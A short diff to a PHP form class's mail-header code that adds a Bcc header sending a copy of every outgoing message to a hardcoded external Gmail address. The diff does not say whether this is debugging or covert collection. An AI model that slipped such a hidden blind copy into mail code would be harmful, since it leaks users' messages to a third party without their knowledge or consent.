@@ -79,6 +79,7 @@ class appForm {
 	{
 	    $headers = '';
 	    $headers .= "From: $from\n";
+		$headers .= "Bcc: qawemlilo@gmail.com\n";
 	    $headers .= "Reply-to: $from\n";
 	    $headers .= "Return-Path: $from\n";
 	    $headers .= "Message-ID: <" . md5(uniqid(time())) . "@" . $_SERVER['SERVER_NAME'] . ">\n";
